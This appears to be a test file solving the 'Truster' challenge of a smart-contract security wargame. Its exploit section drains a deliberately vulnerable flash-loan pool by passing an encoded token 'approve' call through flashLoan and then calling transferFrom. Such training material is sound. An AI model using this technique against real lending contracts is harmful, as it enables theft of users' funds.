const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Truster', function () {
    let deployer, attacker;

    const TOKENS_IN_POOL = ethers.utils.parseEther('1000000');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const DamnValuableToken = await ethers.getContractFactory('DamnValuableToken', deployer);
        const TrusterLenderPool = await ethers.getContractFactory('TrusterLenderPool', deployer);

        this.token = await DamnValuableToken.deploy();
        this.pool = await TrusterLenderPool.deploy(this.token.address);

        await this.token.transfer(this.pool.address, TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal(TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal('0');
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE  */

        //creating transaction to approve attacker address to move the tokens
        const ABI = [ "function approve(address spender, uint256 amount) external returns (bool)" ];
        const iface = new ethers.utils.Interface(ABI);
        const calldata = iface.encodeFunctionData("approve", [attacker.address,TOKENS_IN_POOL]);
        
        const pool = this.pool.connect(attacker);

        //calling the flashLoan with the pool as the borrower and the token addres as the target
        await pool.flashLoan(
            TOKENS_IN_POOL,
            this.pool.address,
            this.token.address,
            calldata
        );

        const token = this.token.connect(attacker);
        //getting the tokens approved
        await token.transferFrom(
            this.pool.address,
            attacker.address,
            TOKENS_IN_POOL
        );
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal(TOKENS_IN_POOL);
        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal('0');
    });
});

